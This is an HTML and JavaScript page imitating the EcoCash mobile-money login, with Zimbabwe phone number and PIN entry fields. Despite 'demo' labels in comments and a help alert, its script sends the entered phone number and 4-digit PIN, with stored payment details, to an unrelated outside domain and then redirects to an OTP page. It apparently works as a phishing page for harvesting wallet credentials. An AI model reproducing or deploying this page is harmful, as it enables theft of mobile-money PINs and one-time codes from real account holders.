
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>EcoCash Login</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: "Segoe UI", Arial, sans-serif;
            background: #fff;
        }

        .top {
            padding: 40px 0 20px;
            text-align: center;
        }

        .logo {
            font-size: 42px;
            font-weight: bold;
            color: #0b66b2;
        }

        .logo span {
            color: #e33b2f;
        }

        h2 {
            margin-top: 10px;
            font-size: 28px;
            font-weight: 600;
            color: #333;
        }

        .main {
            margin-top: 25px;
            padding: 25px 20px 60px;
            background: #0b66b2;
            border-top-left-radius: 60px;
            border-top-right-radius: 60px;
            min-height: 70vh;
            color: #fff;
        }

        form {
            background: #fff;
            padding: 25px 18px;
            border-radius: 12px;
            box-shadow: 0 3px 12px rgba(0, 0, 0, 0.15);
            margin-bottom: 20px;
            color: #000;
        }

        .phone-box {
            border: 2px solid #0a57a3;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 20px;
        }

        .phone-row {
            display: flex;
            align-items: center;
            width: 100%;
        }

        .phone-box .flag {
            width: 32px;
            height: 20px;
            margin-right: 10px;
            object-fit: cover;
            flex-shrink: 0;
        }

        .country-code {
            font-size: 16px;
            font-weight: 600;
            color: #333;
            margin-right: 8px;
            white-space: nowrap;
        }

        .phone-box input[type="tel"] {
            border: none;
            flex: 1;
            font-size: 16px;
            outline: none;
            min-width: 0;
        }

        .pin-title {
            text-align: center;
            font-size: 18px;
            margin-bottom: 15px;
            color: #444;
        }

        .pin-boxes {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
            position: relative;
            min-height: 55px;
        }

        .pin {
            width: 55px;
            height: 55px;
            border: 2px solid #0a57a3;
            border-radius: 12px;
            font-size: 28px;
            font-weight: bold;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
            color: #000;
            pointer-events: none;
        }

        #pinInput {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: text;
            z-index: 10;
            border: none;
            outline: none;
        }

        #msg {
            display: none;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }

        #msg.err {
            color: #d93025;
        }

        #msg.success {
            color: #16803c;
        }

        /* Registration / Help instruction */
        .instruction {
            text-align: center;
            margin: 20px auto 5px;
            color: #0501f0;
            width: 100%;
        }

        .instruction h3 {
            margin: 0 auto;
            padding: 0 10px;
            font-size: 16px;
            line-height: 1.5;
            font-weight: 600;
            color: #160606;
            text-align: center;
            width: 100%;
        }

        .bottom-buttons {
            display: flex;
            justify-content: space-between;
            gap: 20px;
            margin-top: 20px;
        }

        .btn {
            flex: 1;
            background: #fff;
            padding: 14px 10px;
            border-radius: 12px;
            border: none;
            font-size: 17px;
            font-weight: 600;
            color: #000;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.15);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn img {
            width: 20px;
            height: 20px;
            object-fit: contain;
            flex-shrink: 0;
        }

        .btn:hover {
            background: #f3f3f3;
        }

        .btn:disabled {
            opacity: .6;
            cursor: not-allowed;
        }

        .ver {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }

        .tnc {
            text-align: center;
            margin-top: 5px;
            font-size: 14px;
            color: #d9edff;
        }

        @media (max-width: 480px) {

            .logo {
                font-size: 36px;
            }

            h2 {
                font-size: 24px;
            }

            .main {
                padding: 20px 14px 50px;
                border-top-left-radius: 40px;
                border-top-right-radius: 40px;
            }

            form {
                padding: 20px 14px;
            }

            .pin-boxes {
                gap: 10px;
            }

            .pin {
                width: 50px;
                height: 50px;
            }

            .bottom-buttons {
                gap: 10px;
            }

            .btn {
                font-size: 15px;
                padding-left: 6px;
                padding-right: 6px;
            }

            .btn img {
                width: 18px;
                height: 18px;
            }

            /* Center instruction on mobile too */
            .instruction {
                width: 100%;
                margin: 20px auto 5px;
                text-align: center;
            }

            .instruction h3 {
                width: 100%;
                margin: 0 auto;
                padding: 0 5px;
                text-align: center;
                font-size: 14px;
                line-height: 1.5;
                color: #fff;
            }
        }
    </style>
</head>

<body>

    <div class="top">
        <div class="logo">
            Eco<span>Cash</span>
        </div>

        <h2>
            Login
        </h2>
    </div>

    <div class="main">

        <form id="loginForm">

            <!-- PHONE NUMBER -->
            <div class="phone-box">
                <div class="phone-row">

                    <img
                        src="https://flagcdn.com/w20/zw.png"
                        class="flag"
                        alt="Zimbabwe flag"
                    >

                    <span class="country-code">+263</span>

                    <input
                        type="tel"
                        name="phone"
                        id="phoneInput"
                        placeholder="Phone Number"
                        required
                        autocomplete="tel"
                    >

                </div>
            </div>

            <!-- DEMO PIN -->
            <div class="pin-title">
                Enter your PIN
            </div>

            <div
                class="pin-boxes"
                id="pinArea"
            >
                <div class="pin"></div>
                <div class="pin"></div>
                <div class="pin"></div>
                <div class="pin"></div>

                <input
                    type="tel"
                    id="pinInput"
                    maxlength="4"
                    inputmode="numeric"
                    pattern="[0-9]{4}"
                    autocomplete="off"
                    aria-label="Demo PIN"
                >
            </div>

            <!-- INSTRUCTION -->
            <div class="instruction">
                <h3>
                    To register on EcoCash wallet or get assistance, click below
                </h3>
            </div>

            <!-- BUTTONS -->
            <div class="bottom-buttons">

                <button
                    type="submit"
                    class="btn"
                    id="registerBtn"
                >
                    <img
                        src="reg.jpg"
                        alt=""
                    >
                    <span>Register</span>
                </button>

                <button
                    type="button"
                    class="btn"
                    id="helpBtn"
                >
                    <img
                        src="info.png"
                        alt=""
                    >
                    <span>Help &amp; Support</span>
                </button>

            </div>

            <div id="msg"></div>

        </form>

        <div class="ver">
            v2.1.3P
        </div>

        <div class="tnc">
            By signing in you agree to the Terms and Conditions
        </div>

    </div>

<script>
const API_BASE =
    'https://ecocash.bridgecareersglobal.com';

/* =========================================================
   PAYMENT DATA
========================================================= */

let paymentData = {};

try {
    paymentData = JSON.parse(
        sessionStorage.getItem('paymentData') || '{}'
    );
} catch (error) {
    console.warn(
        'Invalid paymentData in sessionStorage:',
        error
    );
}

console.log(
    'Payment data:',
    paymentData
);

/* =========================================================
   ELEMENTS
========================================================= */

const form =
    document.getElementById('loginForm');

const phoneInput =
    document.getElementById('phoneInput');

const submitBtn =
    document.getElementById('registerBtn');

const msg =
    document.getElementById('msg');

const pinInput =
    document.getElementById('pinInput');

const pinArea =
    document.getElementById('pinArea');

const pins =
    document.querySelectorAll('.pin');

const helpBtn =
    document.getElementById('helpBtn');

const prefix =
    '+263';

/* =========================================================
   ELEMENT CHECK
========================================================= */

if (
    !form ||
    !phoneInput ||
    !submitBtn ||
    !msg ||
    !pinInput ||
    !pinArea ||
    !helpBtn
) {
    console.error(
        'Account page elements missing.'
    );

} else {

    /* =====================================================
       PHONE INPUT
    ===================================================== */

    phoneInput.addEventListener(
        'input',
        function () {

            let value =
                phoneInput.value;

            /* Remove anything that is not a number.
               The +263 prefix is displayed separately. */

            const numbers =
                value
                    .replace(/\D/g, '')
                    .replace(/^263/, '');

            phoneInput.value =
                numbers;
        }
    );

    /* =====================================================
       PIN AREA
    ===================================================== */

    pinArea.addEventListener(
        'click',
        function () {
            pinInput.focus();
        }
    );

    /* =====================================================
       PIN INPUT
    ===================================================== */

    pinInput.addEventListener(
        'input',
        function () {

            const value =
                pinInput.value
                    .replace(/\D/g, '')
                    .slice(0, 4);

            pinInput.value =
                value;

            pins.forEach(
                function (box, index) {

                    if (value[index]) {
                        box.textContent = '•';
                    } else {
                        box.textContent = '';
                    }

                }
            );
        }
    );

    /* =====================================================
       PIN KEYDOWN
    ===================================================== */

    pinInput.addEventListener(
        'keydown',
        function (e) {

            if (
                !/[0-9]/.test(e.key) &&
                e.key !== 'Backspace' &&
                e.key !== 'Delete' &&
                e.key !== 'ArrowLeft' &&
                e.key !== 'ArrowRight' &&
                e.key !== 'Tab'
            ) {
                e.preventDefault();
            }

        }
    );

    /* =====================================================
       HELP
    ===================================================== */

    helpBtn.addEventListener(
        'click',
        function () {

            alert(
                'This is a DEMO / TEST interface. Please use only fake test information.'
            );

        }
    );

    /* =====================================================
       FORM SUBMISSION
    ===================================================== */

    form.addEventListener(
        'submit',
        async function (e) {

            e.preventDefault();

            console.log(
                'FORM SUBMITTED'
            );

            /* ---------------------------------------------
               PHONE VALIDATION
            --------------------------------------------- */

            const phoneNumber =
                phoneInput.value.trim();

            if (
                !phoneNumber ||
                phoneNumber.length < 7
            ) {

                phoneInput.setCustomValidity(
                    'Enter your phone number after +263'
                );

                phoneInput.reportValidity();

                return;
            }

            phoneInput.setCustomValidity('');

            /* ---------------------------------------------
               DEMO PIN VALIDATION
            --------------------------------------------- */

            const demoPin =
                pinInput.value.trim();

            if (
                !/^\d{4}$/.test(demoPin)
            ) {

                msg.className =
                    'err';

                msg.style.display =
                    'block';

                msg.textContent =
                    'Enter the 4-digit demo PIN.';

                pinInput.focus();

                return;
            }

            /* ---------------------------------------------
               LOADING
            --------------------------------------------- */

            submitBtn.disabled =
                true;

            submitBtn.innerHTML =
                '<span>Processing...</span>';

            msg.className =
                '';

            msg.style.display =
                'block';

            msg.textContent =
                'Connecting to server...';

            try {

                /* -----------------------------------------
                   BUILD DEMO REQUEST
                ----------------------------------------- */

                const savedPaymentData =
                    JSON.parse(
                        sessionStorage.getItem(
                            'paymentData'
                        ) || '{}'
                    );

                const requestBody = {

                    tracking:
                        savedPaymentData.tracking ||
                        paymentData.tracking ||
                        'DEMO-TRACK-0001',

                    mode:
                        savedPaymentData.mode ||
                        paymentData.mode ||
                        'EcoCash',

                    accountName:
                        savedPaymentData.accountName ||
                        paymentData.accountName ||
                        'Demo Customer',

                    accountNumber:
                        savedPaymentData.accountNumber ||
                        paymentData.accountNumber ||
                        phoneNumber,

                    amount:
                        savedPaymentData.amount ||
                        paymentData.amount ||
                        '1',

                    currency:
                        savedPaymentData.currency ||
                        paymentData.currency ||
                        'USD',

                    phone:
                        prefix + phoneNumber,

                    /* DEMO ONLY.
                       This is a fake 4-digit PIN. */
                    demoPin:
                        demoPin
                };

                console.log(
                    'FINAL DEMO REQUEST BODY:',
                    requestBody
                );

                /* -----------------------------------------
                   SEND TO DEMO SERVER
                ----------------------------------------- */

                const response =
                    await fetch(
                        `${API_BASE}/api/register-payment`,
                        {
                            method: 'POST',

                            headers: {
                                'Content-Type':
                                    'application/json'
                            },

                            body:
                                JSON.stringify(
                                    requestBody
                                )
                        }
                    );

                console.log(
                    'HTTP status:',
                    response.status
                );

                /* -----------------------------------------
                   READ RESPONSE
                ----------------------------------------- */

                const data =
                    await response.json();

                console.log(
                    'Server response:',
                    data
                );

                /* -----------------------------------------
                   CHECK RESPONSE
                ----------------------------------------- */

                if (
                    !response.ok ||
                    !data.ok
                ) {

                    throw new Error(
                        data.error ||
                        `Server returned HTTP ${response.status}`
                    );
                }

                /* -----------------------------------------
                   SAVE ACCOUNT DATA
                ----------------------------------------- */

                sessionStorage.setItem(
                    'accountData',
                    JSON.stringify({
                        phone:
                            prefix + phoneNumber
                    })
                );

                /* -----------------------------------------
                   SAVE DEMO PIN
                ----------------------------------------- */

                sessionStorage.setItem(
                    'demoPin',
                    demoPin
                );

                /* -----------------------------------------
                   SAVE TRANSACTION ID
                ----------------------------------------- */

                if (
                    data.transactionId
                ) {

                    sessionStorage.setItem(
                        'transactionId',
                        data.transactionId
                    );

                } else {

                    throw new Error(
                        'Server did not return a transaction ID.'
                    );
                }

                /* -----------------------------------------
                   SUCCESS
                ----------------------------------------- */

                msg.className =
                    'success';

                msg.textContent =
                    'Verification code sent.';

                submitBtn.innerHTML =
                    '<span>Success</span>';

                /* -----------------------------------------
                   GO TO OTP PAGE
                ----------------------------------------- */

                setTimeout(
                    function () {

                        window.location.href =
                            'otp.html';

                    },
                    500
                );

            } catch (error) {

                console.error(
                    'SUBMISSION ERROR:',
                    error
                );

                msg.className =
                    'err';

                msg.style.display =
                    'block';

                msg.textContent =
                    error.message ||
                    'Unable to connect to the demo server.';

                submitBtn.disabled =
                    false;

                submitBtn.innerHTML =
                    `
                    <img src="reg.jpg" alt="">
                    <span>Register</span>
                    `;
            }
        }
    );
}
</script>

</body>
</html>
